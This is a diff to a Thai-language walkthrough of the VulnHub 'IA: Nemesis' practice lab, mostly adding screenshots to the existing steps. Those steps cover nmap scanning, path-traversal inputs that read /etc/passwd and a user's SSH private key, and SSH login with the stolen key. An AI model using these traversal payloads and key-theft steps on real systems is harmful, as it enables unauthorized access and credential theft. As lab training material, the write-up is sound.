@@ -30,6 +30,10 @@
 - Guest 1 (Attacker): Kali Linux  
 - Guest 2 (Victim): IA : Nemesis (Debian 64-bit) ดาวน์โหลดจาก VulnHub  
 - Network: NAT Network ชื่อ `LAB_NEMESIS` วง `88.88.88.0/24` และเปิด DHCP
+  <img width="825" height="554" alt="image" src="https://github.com/user-attachments/assets/03f9f1bf-1592-489f-ac20-3748fb8e9ec9" />
+  <img width="825" height="644" alt="image" src="https://github.com/user-attachments/assets/1fc073e2-e135-4b2b-9b8d-fd6207dbdd79" />
+
+
 
 > **หมายเหตุ:** IP จริงของ Kali/Nemesis ในเครื่องเราอาจต่างจากตัวอย่าง ให้ดูจาก `ip a` และ `nmap` ของตัวเอง
 
@@ -56,10 +60,12 @@ nmap -sn 88.88.88.0/24
 
 - `-sn` = ping scan / host discovery
 - ใช้ค้นหา IP ของ Nemesis (ดูจาก IP ใหม่ที่ไม่ได้เป็นของ Kali/Default Gateway)
+<img width="825" height="580" alt="image" src="https://github.com/user-attachments/assets/d5ee9d61-77ef-4bae-a716-9375edd22b1d" />
 
 #### บน Kali – สแกนพอร์ตของ Nemesis
 
 สมมติว่าเจอ Nemesis อยู่ที่ `88.88.88.5`:
+
 
 ```bash
 nmap -sS -sV -A 88.88.88.5
@@ -71,6 +77,7 @@ nmap -sS -sV -A 88.88.88.5
 - ผลลัพธ์ที่สนใจ:
   - พอร์ต HTTP เช่น `80/tcp`, `52845/tcp`
   - พอร์ต SSH เช่น `22/tcp`
+<img width="825" height="428" alt="image" src="https://github.com/user-attachments/assets/1b1b353b-29c4-4110-86f5-c53936c5e5f5" />
 
 ---
 
@@ -85,6 +92,8 @@ nmap -sS -sV -A 88.88.88.5
 ```text
 ../../../etc/passwd
 ```
+<img width="825" height="514" alt="image" src="https://github.com/user-attachments/assets/e52cb57b-c2ef-4cba-9cdc-cdfe2b0d8efb" />
+
 
 - ถ้าระบบนำ path ตรง ๆ ไปอ่านไฟล์จากเครื่องเซิร์ฟเวอร์ แล้วโชว์ผลบนหน้าเว็บ
 - เราจะเห็นเนื้อหาไฟล์ `/etc/passwd` (รายชื่อ user บนเครื่อง Nemesis)
@@ -95,6 +104,8 @@ nmap -sS -sV -A 88.88.88.5
 carlos:x:1001:1001::/home/carlos:/bin/bash
 thanos:x:1002:1002::/home/thanos:/bin/bash
 ```
+<img width="825" height="364" alt="image" src="https://github.com/user-attachments/assets/822772fb-89e8-415d-b854-61a0a43a2719" />
+
 
 #### ใช้ LFI อ่าน SSH Private Key ของ `thanos`
 
@@ -103,6 +114,8 @@ thanos:x:1002:1002::/home/thanos:/bin/bash
 ```text
 ../../../../home/thanos/.ssh/id_rsa
 ```
+<img width="825" height="475" alt="image" src="https://github.com/user-attachments/assets/22495d0b-c9db-4e25-8d6d-fd703d63cda4" />
+
 
 ถ้าเว็บไม่ป้องกัน จะได้เนื้อหา SSH private key เช่น:
 
@@ -111,8 +124,11 @@ thanos:x:1002:1002::/home/thanos:/bin/bash
 ...
 -----END OPENSSH PRIVATE KEY-----
 ```
+<img width="825" height="441" alt="image" src="https://github.com/user-attachments/assets/62792177-1f83-4285-b7ea-0b8790bad7b9" />
+
 
 ให้ copy ทั้งบล็อกเก็บไว้ (ใช้ DevTools ช่วยก็ได้)
+<img width="825" height="514" alt="image" src="https://github.com/user-attachments/assets/ff9eb8ba-2842-4343-970f-6cd79705edc9" /> 
 
 ---
 
@@ -124,6 +140,8 @@ thanos:x:1002:1002::/home/thanos:/bin/bash
 cd ~
 nano id_rsa
 ```
+<img width="825" height="408" alt="image" src="https://github.com/user-attachments/assets/12c32813-2c72-4973-9252-caa2e0079cf0" />
+
 
 วางเนื้อหา key ที่ copy มาจากเว็บ (ตั้งแต่ `-----BEGIN` ถึง `-----END`) → save ออกมาจาก nano แล้วตั้ง permission:
 
@@ -140,12 +158,12 @@ chmod 600 id_rsa
 ```bash
 ssh -i id_rsa thanos@88.88.88.5
 ```
-
 ถ้าโจทย์ใช้พอร์ตอื่น (เช่น 52846):
 
 ```bash
 ssh -i id_rsa thanos@88.88.88.5 -p 52846
 ```
+<img width="825" height="366" alt="image" src="https://github.com/user-attachments/assets/98d1805f-a787-4ead-8aee-1c60e65c7613" />
 
 ถ้าสำเร็จ prompt จะเป็น:
 
@@ -164,6 +182,8 @@ cat backup.py
 - `ls` ดูไฟล์ในโฮมของ `thanos` (มักจะมี `backup.py` และ `flag1.txt`)
 - `cat flag1.txt` → อ่าน Flag1
 - `cat backup.py` → ดูสคริปต์ที่เกี่ยวข้องกับการ backup (ใช้โมดูล `zipfile`)
+  <img width="825" height="459" alt="image" src="https://github.com/user-attachments/assets/8e1f4d39-d5c4-41d7-81e4-0204dd2ad6ac" />
+
 
 ---
 
